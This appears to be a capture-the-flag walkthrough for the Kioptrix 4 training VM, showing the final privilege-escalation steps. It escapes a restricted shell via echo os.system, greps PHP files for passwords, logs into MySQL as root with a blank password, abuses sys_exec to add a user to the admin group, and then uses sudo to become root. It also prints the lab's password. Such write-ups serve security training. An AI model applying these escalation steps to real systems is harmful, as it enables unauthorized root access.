We have now reached the peak of the hacking process. Let's try and see what commands can john run.

Command
john:~$ ? #We type "?" to get to see the list of allowed commands.

We find echo which we can try to get a shell.
john:~$ echo os.system('/bin/bash')

Notice that "john:~$ " changes to "john@Kioptrix4:~$"

From here we try to search for the string "password" within the PHP files in john's Computer.

Command
john@Kioptrix4:~$find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null

where : find command is used traverse a directory hierarchy and locate files based on specified criteria. "find /" 
        initiates the find command and tells it to start its search from the root directory of the filesystem (/). 
        
        -maxdepth 5: Limits the depth of the search. It restricts the search to a maximum of five levels deep.
        
        -name *.php: This criterion filters the search results by filename. It specifies that only files whose names end with the extension .php should be considered. The * acts as a wildcard.

        -type f: This further refines the results to ensure that find only processes regular files and ignores other filesystem objects like directories, symbolic links, or special device files.

Research on the remaining ;)

After the output (see FIND.png)

we see that there's a root user with "" as a password meaning blank is the password.

We try to access the mysql interface by trying to login

Commannd
john@Kioptrix4:~$ mysql -u root

Then we try multiple SQL statements to see what more we can find after loogin in

Command 
mysql> select * from mysql.func;

See output in MYSQL1.png

We find a very important element "sys_exec" which can be used for many ways.

we run the command
mysql> select sys_exec('usermod -a -G admin john')

What this command does is adds (-a) John (usermod) to the admin group (-G)

See output in MYSQL2.png

Then quit the mysql interface
command
mysql> quit

Then you will be back to "john@Kioptrix4:~$"

Command are as follows
john@Kioptrix4:~$ sudo su (You will be prompted for password which was "MyNameIsJohn")

shell changes from "john@Kioptrix4:~$" to "root@Kioptrix4:/home/john#" run "whoami" command

Then move into the folder "root".

Thank you for following.
Do an ls -alps then you will see a "congrats.txt" use the cat command to see its contents.
